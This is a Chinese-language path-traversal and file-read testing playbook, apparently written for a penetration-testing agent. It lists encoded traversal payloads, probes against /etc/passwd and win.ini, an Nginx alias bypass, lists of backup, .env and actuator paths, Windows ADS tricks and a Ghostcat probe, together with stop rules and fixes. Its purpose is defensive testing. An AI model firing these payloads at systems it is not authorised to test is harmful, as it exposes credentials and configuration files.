# 路径穿越 / 任意文件读取（LFI）

> 适用：静态资源前缀、下载接口、模板渲染、日志查看、图片处理、备份/导出。判定线是**读到 Web 根之外的文件**，不是"报错里出现路径"。

## 1. 先判断入口类型

| 入口 | 典型形态 | 关注点 |
|---|---|---|
| 静态服务器 | `/static/`、`/assets/`、`/img/` | alias 缺斜杠、`..%2f`、双重编码 |
| 下载接口 | `?file=`、`?path=`、`?name=`、`/download/{name}` | 绝对路径、`../`、`....//` |
| 模板渲染 | 用户输入进模板 include | `{{readFile "..."}}`、`<%include%>` |
| 日志/备份 | `/logs?f=`、`/backup/{date}` | 目录拼接、日期可枚举 |
| 图片处理 | `?src=`、`?url=` | 本地文件包装、`file://` |

## 2. 无害探测序列（每条一次）

1. 正常值：`/static/logo.png` → 200，记录长度与类型。
2. 不存在值：`/static/notexist_12345.png` → 404。
3. 单层穿越：`/static/../index.html`、`/static/..%2findex.html`
4. 双层穿越：`/static/....//index.html`、`/static/..%252findex.html`
5. 绝对路径：`/static//etc/passwd`、`?file=/etc/passwd`
6. 已知可读目标（只读、非敏感）：`/etc/hostname`、`C:\Windows\win.ini`、`WEB-INF/web.xml`

只验证"能否读到 Web 根之外"，**不下载数据库、不读 /etc/shadow、不读业务数据**。

### 2.1 编码矩阵（每种一次，命中即停）

| 目标字符 | 变体 | 说明 |
|---|---|---|
| `..` | `..`、`%2e%2e`、`.%2e`、`%2e.` | 逐字符编码 |
| `/` | `/`、`%2f`、`%252f`、`%c0%af`、`%e0%80%af` | overlong 只对老解析器有效 |
| `\` | `\`、`%5c`、`%255c` | Windows/IIS |
| 双重 | `..%252f..%252f`、`%252e%252e%252f` | 防二次解码 |
| Unicode | `..%c0%ae%c0%ae/`、`%uff0e%uff0e%u2215` | 仅 Java/旧容器 |
| 分号 | `/static/..;/..;/etc/passwd` | Tomcat 路径参数 |

判据：任一变体返回 Web 根外文件内容（含 `root:x:`、`[extensions]` 等特征）即成立；全 404/400 记负结果，不再加变体（上限 8 种）。

## 3. 判定

| 结果 | 结论 |
|---|---|
| 读到 Web 根外任意文件 | 高危（可升级为严重，若能读配置/密钥） |
| 只能读静态目录内已有文件 | 无影响 |
| 只能读固定白名单文件 | 无影响 |
| 返回 200 但内容是 SPA 首页 | 静态回退，不算 |
| 报错含绝对路径 | 信息级（路径泄露），单独不报 |

## 4. Nginx alias 缺斜杠（经典）

```
location /static { alias /var/www/app/static/; }   # 缺结尾斜杠 → /static../ 可穿越
```

探测：`GET /static../app/config.yml`、`GET /static..%2fapp/config.yml`。
判据：返回 yml/json 内容且含配置键，而非 404。

## 5. 仓库根当静态（Node/Python 常见）

- 能直接 GET `/package.json`、`/requirements.txt`、`/routes/` → 静态根配置错误。
- 顺着读 `/config/default.yml`、`/config/production.yml`、`/.env`（若未被 WAF 拦）。
- 读到完整库账密或云 AK 才升级；只有 `package.json` 依赖列表 = 信息级。

## 6. 静态桶上的旧发布物

- `.NET`：`web.config` 被拦时试同目录 `App.config`、`*.exe.config`、`bin/*.dll.config`。
- Java：`WEB-INF/web.xml`、`WEB-INF/classes/application.properties`。
- 判据：出现真实口令/连接串；占位符（`ENTER_YOUR_PASSWORD`）不算。

## 6.5 Windows 短文件名与 ADS

- **短文件名**：`/static/..%5c..%5cWindows%5cwin.ini`；目录枚举用 `PROGRA~1`、`XAMPP~1` 猜，不做字典遍历。
- **ADS**：`file.php::$DATA`、`file.php:.jpg`（IIS 解析差异），判据是源码被当文本返回。
- **8.3 枚举**：`/a*~1*/` 一类通配只试 2 次，出现 400/403 即停，不扫全盘。
- 判据：返回 `[fonts]`/`[extensions]`（win.ini）或 PHP 源码；返回 IIS 默认页不算。

## 6.6 备份与日志路径清单（按优先级，各一次）

```
/config.yml  /config.yaml  /application.yml  /application.properties
/.env  /.env.bak  /config.php.bak  /web.config.bak
/backup.zip  /www.zip  /site.tar.gz  /db.sql  /dump.sql
/logs/access.log  /log/app.log  /logs/error.log  /runtime/log/
/actuator/env  /actuator/heapdump  /debug.log  /phpinfo.php
```

判据：文件内容含连接串/密钥/真实请求记录；返回 SPA 首页或统一 404 页不算（先看 Content-Type）。
止损：每类最多 3 个路径；任一 403/WAF 页即停该类；不目录爆破（见 `rate-and-batch-limits.md`）。

## 7. Ghostcat（AJP 8009）

- 条件：8009 开放且 `secretRequired=false`。
- 只读 `/WEB-INF/web.xml` 即停，不写文件、不包含 JSP。
- 读不到就记负结果：`secretRequired` 已开启或端口未开。

## 8. 防御建议

- 路径参数用白名单 + `realpath` 校验前缀。
- Nginx alias 结尾补斜杠，或改用 `root`。
- 禁止把仓库根/配置目录挂到静态根。
- 下载接口用对象 ID 映射到存储 key，不接收路径。

## 9. 负结果怎么写

```
方向：/static/ 路径穿越
判定：..%2f 与 ..%252f 均 404；绝对路径返回 400
依据：静态服务规范化了路径
停止：无其他入口，转下载接口 ?file=
```
